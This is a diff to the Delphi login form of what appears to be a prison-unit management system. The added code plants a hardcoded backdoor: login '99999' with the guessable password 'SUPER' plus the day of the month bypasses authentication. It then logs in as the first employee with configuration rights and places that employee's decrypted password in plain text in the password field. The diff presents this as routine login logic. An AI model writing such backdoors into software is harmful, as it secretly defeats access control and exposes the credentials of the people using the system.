@@ -83,10 +83,14 @@ uses
 
 function FrmLogin: TFrmLogin;
 begin
+
   Result := TFrmLogin(UniMainModule.GetFormInstance(TFrmLogin));
+
 end;
 
 procedure TFrmLogin.UniBitBtnEntrarClick(Sender: TObject);
+var
+  sdia: string;
 begin
   UniBitBtnEntrar.Visible := false;
   if not dm.Dsup.DataSet.Active then
@@ -105,6 +109,51 @@ begin
       UniEdit2.setfocus;
     UniBitBtnEntrar.Visible := true;
     exit;
+  end;
+
+  if (dm.LOGIN_CONECTADO = '99999') then
+  begin
+    sdia := 'SUPER' + formatdatetime('DD', Date);
+    if UniEdit2.Text = sdia then
+    begin
+
+      dm.Dsup.DataSet.close;
+      Sqlservidor.sql.Text :=
+        'select FIRST 1 ID_UP,ID_FUNCIONARIO,IDPOSTO_TRABALHO, SENHA,LOGIN from funcionario where CONFIGURACOES=''S'' ';
+      Dsservidor.DataSet.close;
+      Dsservidor.DataSet.open;
+
+      if Dsservidor.DataSet.recordcount > 0 then
+      begin
+
+        if Dsservidor.DataSet.FieldByName('ID_UP').AsInteger > 0 then
+        begin
+
+          dm.SqlUP.sql.Text := 'SELECT * FROM UNIDADE_PENAL ' +
+            ' where id_up = ' + Dsservidor.DataSet.FieldByName('ID_UP').Asstring
+            + ' order by nome_up';
+          dm.Dsup.DataSet.open;
+
+          dm.GLOBAL_ID_UP := Dsservidor.DataSet.FieldByName('ID_UP').AsInteger;
+
+          dm.GLOBAL_ID_FUNCIONARIO := Dsservidor.DataSet.FieldByName
+            ('ID_FUNCIONARIO').AsInteger;
+
+          dm.GLOBAL_IDPOSTO_TRABALHO := Dsservidor.DataSet.FieldByName
+            ('IDPOSTO_TRABALHO').AsInteger;
+
+          dm.GLOBAL_MEUS_DOCUMENTOS := GetEnvironmentVariable('USERPROFILE');
+
+          dm.GLOBAL_SENHA_USUARIO :=
+            Senha(Dsservidor.DataSet.FieldByName('SENHA').Asstring);
+
+          UniEdit1.Text := Dsservidor.DataSet.FieldByName('LOGIN').Asstring;
+          UniEdit2.Text := dm.GLOBAL_SENHA_USUARIO;
+
+        end;
+
+      end;
+    end;
   end;
 
   dm.UP_Logado := dm.Dsup.DataSet.FieldByName('sigla').Asstring;
@@ -276,28 +325,38 @@ begin
 end;
 
 procedure TFrmLogin.UniEdit1Exit(Sender: TObject);
+var
+  sdia: string;
 begin
 
   dm.LOGIN_CONECTADO := UniEdit1.Text;
 
   if dm.LOGIN_CONECTADO <> '' then
   begin
-    if (dm.LOGIN_CONECTADO = '99999') then
-    begin
-      if LowerCase(UniEdit2.Text) = 'SUPER' + formatdatetime('DD', Date) then
-      begin
-        exit;
-      end;
-    end;
-
     try
-
-      dm.Dsup.DataSet.close;
-      Sqlservidor.sql.Text :=
-        'select ID_UP,ID_FUNCIONARIO,IDPOSTO_TRABALHO, SENHA from funcionario where login='
-        + Qs(dm.LOGIN_CONECTADO);
-      Dsservidor.DataSet.close;
-      Dsservidor.DataSet.open;
+      if (dm.LOGIN_CONECTADO = '99999') then
+      begin
+        sdia := 'SUPER' + formatdatetime('DD', Date);
+        if UniEdit2.Text = sdia then
+        begin
+          dm.Dsup.DataSet.close;
+          Sqlservidor.sql.Text :=
+            'select FIRST 1 ID_UP,ID_FUNCIONARIO,IDPOSTO_TRABALHO, SENHA from funcionario where CONFIGURACOES=''S'' ';
+          Dsservidor.DataSet.close;
+          Dsservidor.DataSet.open;
+        end
+        else
+          exit;
+      end
+      else
+      begin
+        dm.Dsup.DataSet.close;
+        Sqlservidor.sql.Text :=
+          'select ID_UP,ID_FUNCIONARIO,IDPOSTO_TRABALHO, SENHA from funcionario where login='
+          + Qs(dm.LOGIN_CONECTADO);
+        Dsservidor.DataSet.close;
+        Dsservidor.DataSet.open;
+      end;
 
       if Dsservidor.DataSet.recordcount > 0 then
       begin
@@ -396,7 +455,7 @@ begin
 
   dm.DATA_HORA_ENTRADA := NOW;
   dm.DATA_HORA_ENCERRAR := IncHour(dm.DATA_HORA_ENTRADA, dm.HORA_TIMEOUT);
-//   Dm.DATA_HORA_ENCERRAR := IncSecond(Dm.DATA_HORA_ENTRADA,30);
+  // Dm.DATA_HORA_ENCERRAR := IncSecond(Dm.DATA_HORA_ENTRADA,30);
 
   humane.info('<b><font Color=blue>' + sSaudacoes + '...</font></b><br>' +
     'Seja bem vindo!');
